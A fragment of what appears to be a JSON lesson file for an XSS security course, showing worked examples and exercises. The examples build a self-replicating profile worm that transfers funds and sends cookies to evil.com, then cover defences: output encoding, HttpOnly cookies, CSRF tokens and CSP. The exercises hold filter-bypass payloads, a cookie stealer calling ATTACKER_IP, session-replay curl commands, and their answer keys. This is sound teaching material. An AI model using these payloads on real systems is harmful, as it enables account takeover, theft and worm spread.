+          "code": "// THE CLONE TECHNIQUE:\n<script id=\"clone\">\n  var startTag = '<script id=\"clone\">';\n  var content = document.getElementById('clone').innerHTML;\n  var endTag = '</' + 'script>';\n  var fullClone = startTag + content + endTag;\n  alert(fullClone);\n</script>\n\n// WHAT HAPPENS:\n// 1. Script has id='clone' so it can reference itself\n// 2. innerHTML reads EVERYTHING between <script> and </script>\n// 3. We reconstruct the complete tag: start + content + end\n// 4. alert() proves we have an exact copy\n\n// WHY '</' + 'script>' INSTEAD OF '</script>'?\n// If we write </script> inside the script tag,\n// the HTML parser thinks the script ENDS there.\n// It would break the script! Concatenation avoids this.\n\n// TEST: The alert should show the COMPLETE script,\n// including the var declarations and the alert itself.\n// If it does → the script can clone itself perfectly.",
+          "output": "Alert displays the complete reconstructed script source code → self-reading ability confirmed → ready for worm propagation",
+          "ai_explanation": "This is the critical building block. If a script can read itself, it can write itself into another user's profile. That's the difference between a one-time attack and a self-replicating worm.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 7: Worm Propagation via Profile Injection",
+          "description": "Use the clone technique to write the worm into the victim's profile, enabling propagation.",
+          "difficulty": "advanced",
+          "code": "// COMPLETE PROPAGATION MECHANISM:\n<script id=\"worm\">\n  // Step 1: Clone the worm\n  var s = '<script id=\"worm\">';\n  var c = document.getElementById('worm').innerHTML;\n  var e = '</' + 'script>';\n  var clone = s + c + e;\n  \n  // Step 2: Write clone to victim's profile\n  // Option A: Using the app's own helper function:\n  ajaxSyncRequest('/account', clone);\n  \n  // Option B: Using raw XMLHttpRequest:\n  // var xhr = new XMLHttpRequest();\n  // xhr.open('POST', '/account', false);\n  // xhr.setRequestHeader('Content-Type',\n  //   'application/x-www-form-urlencoded');\n  // xhr.send('description=' + encodeURIComponent(clone));\n  \n  // PROBLEM WITH OPTION B:\n  // encodeURIComponent turns <script> into %3Cscript%3E\n  // The encoded version is stored as TEXT, not HTML.\n  // It won't execute when the next victim views it!\n  \n  // WHY OPTION A WORKS:\n  // ajaxSyncRequest() handles encoding correctly\n  // because it's the app's OWN function for profile updates.\n  // The worm survives the database round-trip as executable HTML.\n</script>",
+          "output": "Victim's profile now contains the worm → next visitor will be infected → exponential propagation enabled",
+          "ai_explanation": "The encoding problem is the #1 reason worms fail. If the clone gets URL-encoded (%3Cscript%3E), it becomes visible text, not executable code. Using the app's own update function solves this.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 8: Combined Worm: Steal + Transfer + Replicate",
+          "description": "The complete worm that performs all three actions simultaneously.",
+          "difficulty": "advanced",
+          "code": "// THE COMPLETE WORM:\n<script id=\"worm\">\n  // === REPLICATE ===\n  var s = '<script id=\"worm\">';\n  var c = document.getElementById('worm').innerHTML;\n  var e = '</' + 'script>';\n  var clone = s + c + e;\n  \n  // === STEAL FUNDS ===\n  var x = new XMLHttpRequest();\n  x.open('POST', '/transfer', false);\n  x.setRequestHeader('Content-Type',\n    'application/x-www-form-urlencoded');\n  x.send('to=999999&transferAmount=500');\n  \n  // === PROPAGATE ===\n  ajaxSyncRequest('/account', clone);\n  \n  // === EXFILTRATE COOKIE ===\n  new Image().src = 'http://evil.com/?c=' + document.cookie;\n</script>\n\n// EXECUTION ORDER:\n// 1. Victim visits infected profile\n// 2. Worm reads its own source (clone)\n// 3. XMLHttpRequest transfers 500$ to attacker (silent)\n// 4. ajaxSyncRequest writes worm to victim's profile\n// 5. Image request sends cookie to attacker's server\n// 6. Next visitor triggers the same cycle",
+          "output": "Funds stolen + cookie exfiltrated + worm propagated to victim's profile → complete attack chain in one payload",
+          "ai_explanation": "This is the most advanced XSS attack possible. It chains four vulnerabilities (stored XSS, missing CSRF token, HttpOnly=false, no input validation) into a self-replicating worm.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 9: Defence: Output Encoding",
+          "description": "The #1 defence against XSS — encode output so scripts display as text instead of executing.",
+          "difficulty": "intermediate",
+          "code": "// VULNERABLE CODE:\nString description = database.getProfile(userId);\nout.println(\"<div>\" + description + \"</div>\");\n// If description = <script>alert(1)</script>\n// HTML: <div><script>alert(1)</script></div>\n// Browser EXECUTES the script!\n\n// SECURE CODE:\nString description = database.getProfile(userId);\nString encoded = description\n    .replace(\"&\", \"&amp;\")\n    .replace(\"<\", \"&lt;\")\n    .replace(\">\", \"&gt;\")\n    .replace(\"\\\"\", \"&quot;\")\n    .replace(\"'\", \"&#x27;\");\nout.println(\"<div>\" + encoded + \"</div>\");\n// If description = <script>alert(1)</script>\n// HTML: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>\n// Browser displays it as TEXT. Script NEVER executes.\n\n// EVEN BETTER — use a library:\nimport org.owasp.encoder.Encode;\nout.println(\"<div>\" + Encode.forHtml(description) + \"</div>\");\n// OWASP Encoder handles ALL edge cases automatically.",
+          "output": "Script displayed as visible text '&lt;script&gt;alert(1)&lt;/script&gt;' instead of executing → XSS prevented → entire chain broken at step 1",
+          "ai_explanation": "Output encoding is the single most effective defence. It breaks the chain at the very first step — if the script never executes, nothing else in the chain can happen.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 10: Defence: HttpOnly and Secure Cookies",
+          "description": "Set cookie flags to prevent JavaScript access and network interception.",
+          "difficulty": "beginner",
+          "code": "// VULNERABLE COOKIE SETUP (Java):\nCookie session = new Cookie(\"JSESSIONID\", sessionId);\nresponse.addCookie(session);\n// document.cookie RETURNS the session ID\n// Cookie sent over HTTP (can be intercepted)\n\n// SECURE COOKIE SETUP:\nCookie session = new Cookie(\"JSESSIONID\", sessionId);\nsession.setHttpOnly(true);   // JavaScript CANNOT read it\nsession.setSecure(true);     // Only sent over HTTPS\nsession.setMaxAge(1800);     // Expires in 30 minutes\nresponse.addCookie(session);\n\n// With SameSite (requires Servlet 6.0+ or header):\nresponse.setHeader(\"Set-Cookie\",\n    \"JSESSIONID=\" + sessionId +\n    \"; HttpOnly; Secure; SameSite=Strict; Path=/\");\n\n// TEST:\n// document.cookie now returns '' (empty)\n// XSS payload: alert(document.cookie) shows nothing useful\n// Cookie NOT sent with cross-site requests (SameSite=Strict)\n// Chain broken: XSS exists but CANNOT steal the session!",
+          "output": "document.cookie returns empty string → session cookie invisible to JavaScript → session hijacking chain broken",
+          "ai_explanation": "Three flags, three layers of protection: HttpOnly stops JavaScript theft, Secure stops network sniffing, SameSite stops cross-site request attachment.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 11: Defence: CSRF Tokens",
+          "description": "Add anti-CSRF tokens to break the fund transfer step of the chain.",
+          "difficulty": "intermediate",
+          "code": "// VULNERABLE TRANSFER FORM:\n<form action=\"/transfer\" method=\"POST\">\n    <input name=\"to\" type=\"text\">\n    <input name=\"amount\" type=\"text\">\n    <button>Transfer</button>\n</form>\n// ANY POST request to /transfer is accepted!\n// XHR can silently submit this form.\n\n// SECURE TRANSFER FORM:\n<form action=\"/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"csrf_token\"\n           value=\"a8f2e9b1-random-uuid-here\">\n    <input name=\"to\" type=\"text\">\n    <input name=\"amount\" type=\"text\">\n    <button>Transfer</button>\n</form>\n\n// SERVER-SIDE VALIDATION:\nString submittedToken = request.getParameter(\"csrf_token\");\nString sessionToken = (String) session.getAttribute(\"csrf_token\");\nif (submittedToken == null || !submittedToken.equals(sessionToken)) {\n    response.sendError(403, \"Invalid CSRF token\");\n    return;  // REJECT the request!\n}\n// XHR from XSS does NOT know the token value\n// → transfer REJECTED → funds safe!",
+          "output": "XMLHttpRequest transfer returns 403 Forbidden → CSRF token validation rejects the request → fund theft prevented",
+          "ai_explanation": "The XSS worm can steal cookies and replicate, but it CANNOT transfer funds if there's a CSRF token — because the token is unique per session and the worm doesn't know its value.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 12: Defence: Content Security Policy",
+          "description": "Use CSP headers to block inline script execution entirely.",
+          "difficulty": "advanced",
+          "code": "// WITHOUT CSP — browser executes ANY script:\n// <script>alert('XSS')</script> → EXECUTES\n// <img onerror=\"alert(1)\"> → EXECUTES\n// <div onmouseover=\"alert(1)\"> → EXECUTES\n\n// WITH CSP — browser blocks inline scripts:\n// Server sends this header:\n// Content-Security-Policy: script-src 'self'\n\n// Now:\n// <script>alert('XSS')</script> → BLOCKED\n// <img onerror=\"alert(1)\"> → BLOCKED\n// <div onmouseover=\"alert(1)\"> → BLOCKED\n// <script src=\"/js/app.js\"></script> → ALLOWED (same origin)\n\n// IN JAVA SERVLET:\nresponse.setHeader(\"Content-Security-Policy\",\n    \"script-src 'self'; \" +      // Only scripts from our domain\n    \"style-src 'self'; \" +        // Only styles from our domain\n    \"img-src 'self' data:; \" +    // Images from our domain + data URIs\n    \"default-src 'self'; \" +      // Everything else: our domain only\n    \"report-uri /csp-report\");    // Log violations\n\n// CSP is the nuclear option against XSS:\n// Even if a script gets injected into the HTML,\n// the BROWSER refuses to execute it.\n// The entire worm is dead before it starts.",
+          "output": "Browser console shows 'Refused to execute inline script' → CSP blocks ALL injected scripts → worm cannot execute at all",
+          "ai_explanation": "CSP is the strongest defence because it works even when output encoding fails. The browser itself enforces the policy — no inline script can execute, period.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        }
+      ],
+      "visual_diagram": {
+        "title": "Attack Chain & XSS Worm — Complete Flow",
+        "content": "<div style=\"font-family: monospace; line-height: 1.8; padding: 20px;\">\n<div style=\"text-align: center; margin-bottom: 20px;\">\n<span style=\"background: #e74c3c; color: white; padding: 8px 20px; border-radius: 6px; font-size: 18px; font-weight: bold;\">ATTACK CHAIN FLOWCHART</span>\n</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #3498db; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 1: INJECTION</span>\n</div>\n<span style=\"color: #e74c3c;\">&#9654;</span> Attacker logs in as admin\n<span style=\"color: #e74c3c;\">&#9654;</span> Opens profile page (/account)\n<span style=\"color: #e74c3c;\">&#9654;</span> Types <span style=\"background: #f8d7da; padding: 2px 6px; border-radius: 3px;\">&lt;script id=\\\"worm\\\"&gt;...&lt;/script&gt;</span> in description field\n<span style=\"color: #e74c3c;\">&#9654;</span> Clicks save &#x2192; <span style=\"color: #e74c3c; font-weight: bold;\">payload stored in database WITHOUT sanitisation</span>\n\n<div style=\"text-align: center; margin: 15px 0;\">&#x2193; &#x2193; &#x2193;</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #f39c12; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 2: TRIGGER</span>\n</div>\n<span style=\"color: #f39c12;\">&#9654;</span> Victim (user1) visits attacker's profile (?username=admin)\n<span style=\"color: #f39c12;\">&#9654;</span> Server loads profile from database\n<span style=\"color: #f39c12;\">&#9654;</span> <span style=\"color: #e74c3c; font-weight: bold;\">Script tag rendered as HTML &#x2192; browser EXECUTES it</span>\n<span style=\"color: #f39c12;\">&#9654;</span> Worm is now running in victim's browser with victim's session\n\n<div style=\"text-align: center; margin: 15px 0;\">&#x2193; &#x2193; &#x2193;</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 3: PAYLOAD (3 simultaneous actions)</span>\n</div>\n\n<div style=\"margin-left: 20px;\">\n<span style=\"background: #9b59b6; color: white; padding: 3px 10px; border-radius: 3px;\">ACTION A</span> <span style=\"color: #9b59b6;\">Cookie Theft:</span>\nnew Image().src = 'http://evil.com/?c=' + document.cookie\n&#x2192; JSESSIONID sent to attacker's server (<span style=\"color: #e74c3c;\">HttpOnly=false!</span>)\n\n<span style=\"background: #e74c3c; color: white; padding: 3px 10px; border-radius: 3px;\">ACTION B</span> <span style=\"color: #e74c3c;\">Fund Transfer:</span>\nXMLHttpRequest POST /transfer {to: 999999, amount: 500}\n&#x2192; 500$ stolen from victim (<span style=\"color: #e74c3c;\">no CSRF token!</span>)\n\n<span style=\"background: #f39c12; color: white; padding: 3px 10px; border-radius: 3px;\">ACTION C</span> <span style=\"color: #f39c12;\">Self-Replication:</span>\najaxSyncRequest('/account', wormClone)\n&#x2192; Worm copied to victim's profile\n</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">&#x2193; &#x2193; &#x2193;</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #2ecc71; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 4: PROPAGATION (exponential)</span>\n</div>\n<span style=\"color: #2ecc71;\">&#9654;</span> User2 visits user1's profile &#x2192; <span style=\"color: #e74c3c;\">infected!</span> &#x2192; worm copies to user2's profile\n<span style=\"color: #2ecc71;\">&#9654;</span> User3 visits user2's profile &#x2192; <span style=\"color: #e74c3c;\">infected!</span> &#x2192; worm copies to user3's profile\n<span style=\"color: #2ecc71;\">&#9654;</span> Growth: 1 &#x2192; 2 &#x2192; 4 &#x2192; 8 &#x2192; 16 &#x2192; 32 &#x2192; 64 &#x2192; 128 &#x2192; <span style=\"color: #e74c3c; font-weight: bold;\">1,000,000+</span>\n\n<div style=\"text-align: center; margin: 20px 0;\">\n<span style=\"background: #2ecc71; color: white; padding: 8px 16px; border-radius: 6px; font-size: 16px;\">BREAKING THE CHAIN &#x2014; Any ONE defence stops it all:</span>\n</div>\n<div style=\"border: 2px solid #2ecc71; padding: 12px; border-radius: 8px; margin: 10px 0;\">\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>Output Encoding</strong> &#x2192; &lt;script&gt; becomes &amp;lt;script&amp;gt; &#x2192; never executes\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>CSP Header</strong> &#x2192; script-src 'self' blocks inline scripts\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>HttpOnly Cookie</strong> &#x2192; document.cookie returns nothing\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>CSRF Token</strong> &#x2192; XMLHttpRequest transfer REJECTED\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>Input Validation</strong> &#x2192; script tags stripped on save\n</div>\n\n<div style=\"text-align: center; margin-top: 15px; padding: 10px; background: #f8f9fa; border-radius: 6px;\">\n<strong>Remember:</strong> The Samy worm used this EXACT pattern and infected 1 million profiles in 20 hours.\nDefence in depth means every layer catches what the last one missed.\n</div>\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: Identify the XSS Sink",
+          "description": "The code below displays user input. Find where XSS is possible.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Profile page servlet:\nString desc = database.getDescription(userId);\nout.println(\"<div class='profile'>\" + desc + \"</div>\");\n\n// TODO: Which line is vulnerable? Why?\n// Answer: ___",
+          "expected_output": "The vulnerable line is the println — user data goes directly into HTML without encoding",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: The vulnerable line is the println — user data goes directly into HTML without e..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Stored vs Reflected",
+          "description": "Classify each XSS example as Stored or Reflected.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Example A:\nString query = request.getParameter(\"q\");\nout.println(\"Results for: \" + query);\n\n// Example B:\nString comment = database.getComment(id);\nout.println(\"<p>\" + comment + \"</p>\");\n\n// Example C:\nString name = request.getHeader(\"Referer\");\nout.println(\"<!-- From: \" + name + \" -->\");\n\n// TODO: A = ___, B = ___, C = ___",
+          "expected_output": "A=Reflected (from URL param), B=Stored (from database), C=Reflected (from header)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: A=Reflected (from URL param), B=Stored (from database), C=Reflected (from header..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Write a Basic XSS Payload",
+          "description": "Write a script tag that displays 'HACKED' in an alert box.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Write the XSS payload that shows alert('HACKED')\nString payload = \"___\";\n\n// Where would you inject it?\n// Answer: ___",
+          "expected_output": "<script>alert('HACKED')</script> — inject in any unsanitised input field",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: <script>alert('HACKED')</script> — inject in any unsanitised input field..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: Bypass a Simple Filter",
+          "description": "The developer removes <script> tags. Find a bypass.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Filter code:\nString clean = input.replaceAll(\"<script>\", \"\");\nout.println(clean);\n\n// TODO: Write 3 payloads that bypass this filter\n// Payload 1: ___\n// Payload 2: ___\n// Payload 3: ___",
+          "expected_output": "1: <SCRIPT>alert(1)</SCRIPT> (case), 2: <scr<script>ipt>alert(1)</script> (nesting), 3: <img onerror=alert(1) src=x> (no script tag)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: <SCRIPT>alert(1)</SCRIPT> (case), 2: <scr<script>ipt>alert(1)</script> (nesti..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: DOM-based XSS",
+          "description": "Find the XSS in this client-side JavaScript.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Page JavaScript:\nvar search = window.location.hash.substring(1);\ndocument.getElementById('results').innerHTML =\n    'Showing results for: <b>' + search + '</b>';\n\n// TODO: Write the attack URL\n// http://bank.com/search#___",
+          "expected_output": "http://bank.com/search#<img src=x onerror=alert(document.cookie)> — innerHTML renders the tag",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: http://bank.com/search#<img src=x onerror=alert(document.cookie)> — innerHTML re..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: XSS in HTML Attributes",
+          "description": "Inject XSS by breaking out of an HTML attribute.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Server code:\nout.println(\"<img src='\" + userInput + \"'>\")\n\n// TODO: What input breaks out of the src attribute?\n// Input: ___\n// Resulting HTML: ___",
+          "expected_output": "Input: x' onerror='alert(1) → HTML: <img src='x' onerror='alert(1)'>",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Input: x' onerror='alert(1) → HTML: <img src='x' onerror='alert(1)'>..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: XSS via Event Handlers",
+          "description": "Write 5 XSS payloads that don't use <script> tags.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// The filter blocks <script> tags entirely.\n// TODO: Write 5 alternative XSS vectors:\n// 1: ___\n// 2: ___\n// 3: ___\n// 4: ___\n// 5: ___",
+          "expected_output": "1: <img onerror=alert(1) src=x> 2: <svg onload=alert(1)> 3: <body onload=alert(1)> 4: <div onmouseover=alert(1)>hover</div> 5: <input onfocus=alert(1) autofocus>",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: <img onerror=alert(1) src=x> 2: <svg onload=alert(1)> 3: <body onload=alert(1..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Test for Stored XSS",
+          "description": "Write a systematic test plan to check if a form field is vulnerable to stored XSS.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Form field: Product Review comment box\n// TODO: List 5 test payloads in order from simple to complex:\n// Test 1 (basic): ___\n// Test 2 (event): ___\n// Test 3 (encoding): ___\n// Test 4 (nested): ___\n// Test 5 (polyglot): ___",
+          "expected_output": "1: <script>alert(1)</script> 2: <img src=x onerror=alert(1)> 3: &lt;script&gt; check encoding 4: <scr<script>ipt> 5: jaVasCript:alert(1)//",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: <script>alert(1)</script> 2: <img src=x onerror=alert(1)> 3: &lt;script&gt; c..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: XSS Impact Assessment",
+          "description": "Rate the severity of each XSS location.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// Location A: Search results page (reflected)\n// Location B: User profile bio (stored, visible to all)\n// Location C: Admin dashboard notes (stored, admin only)\n// Location D: Password reset email (reflected)\n\n// TODO: Rank from MOST to LEAST dangerous:\n// 1st: ___ because ___\n// 2nd: ___ because ___\n// 3rd: ___ because ___\n// 4th: ___ because ___",
+          "expected_output": "1st: B (stored, all users see it = worm potential), 2nd: C (stored, admin = privilege escalation), 3rd: D (reflected but in email = phishing), 4th: A (reflected, needs victim to click)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1st: B (stored, all users see it = worm potential), 2nd: C (stored, admin = priv..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Fix the Vulnerable Code",
+          "description": "Apply output encoding to prevent XSS.",
+          "difficulty": "beginner",
+          "category": "XSS Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on XSS Fundamentals! This exercise builds your understanding step by step.",
+          "starter_code": "// VULNERABLE:\nString review = database.getReview(productId);\nout.println(\"<div>\" + review + \"</div>\");\n\n// TODO: Fix this code using manual encoding:\nString review = database.getReview(productId);\n// Add encoding here:\nString safe = review___;\nout.println(\"<div>\" + safe + \"</div>\");",
+          "expected_output": "safe = review.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"\\\"\",\"&quot;\")",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: safe = review.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").repla..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Read Cookies with JavaScript",
+          "description": "Write code that displays all cookies accessible to JavaScript.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Write one line that shows all cookies:\n// ___\n\n// What cookie name is typically the session ID?\n// Answer: ___\n\n// What flag prevents JavaScript from reading cookies?\n// Answer: ___",
+          "expected_output": "document.cookie / JSESSIONID (or PHPSESSID) / HttpOnly flag",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: document.cookie / JSESSIONID (or PHPSESSID) / HttpOnly flag..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Build a Cookie Stealer",
+          "description": "Write an XSS payload that sends cookies to a remote server.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// Attacker's server: python3 -m http.server 8000\n// TODO: Complete the cookie-stealing payload:\n<script>\nvar img = new Image();\nimg.src = '___' + document.cookie;\n</script>",
+          "expected_output": "img.src = 'http://ATTACKER_IP:8000/?c=' + document.cookie",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: img.src = 'http://ATTACKER_IP:8000/?c=' + document.cookie..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: Analyse Server Logs",
+          "description": "Read the attacker's server log and extract the session cookie.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// Server log:\n// 127.0.0.1 - [06/Mar] \"GET /?c=JSESSIONID=node016d4q HTTP/1.1\" 200\n// 127.0.0.1 - [06/Mar] \"GET /?c=JSESSIONID=node01ph03 HTTP/1.1\" 200\n\n// TODO:\n// How many different sessions were captured? ___\n// Session 1 ID: ___\n// Session 2 ID: ___\n// Are they from the same user? ___",
+          "expected_output": "2 sessions / node016d4q / node01ph03 / No — different JSESSIONID values mean different users",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 2 sessions / node016d4q / node01ph03 / No — different JSESSIONID values mean dif..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: Write a curl Replay Command",
+          "description": "Use a stolen cookie to access the victim's account.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// Stolen cookie: JSESSIONID=node0abc123xyz.node0\n// Target: http://localhost:15000/account\n\n// TODO: Write the curl command:\n// curl ___",
+          "expected_output": "curl http://localhost:15000/account --cookie 'JSESSIONID=node0abc123xyz.node0'",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: curl http://localhost:15000/account --cookie 'JSESSIONID=node0abc123xyz.node0'..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: Transfer Funds via curl",
+          "description": "Use a stolen session to make an authenticated transfer.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// Stolen cookie: JSESSIONID=node0abc123xyz.node0\n// Transfer 500$ to card 999999\n\n// TODO: Write the full curl command:\n// curl -X POST http://localhost:15000/transfer \\\n//   ___",
+          "expected_output": "-H 'Content-Type: application/x-www-form-urlencoded' -d 'to=999999&transferAmount=500' --cookie 'JSESSIONID=node0abc123xyz.node0'",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: -H 'Content-Type: application/x-www-form-urlencoded' -d 'to=999999&transferAmoun..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Detect Session Hijacking",
+          "description": "As a defender, what signs indicate session hijacking?",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft & Session Hijacking",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Cookie Theft & Session Hijacking! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: List 5 indicators that a session might be hijacked:\n// 1: ___\n// 2: ___\n// 3: ___\n// 4: ___\n// 5: ___",
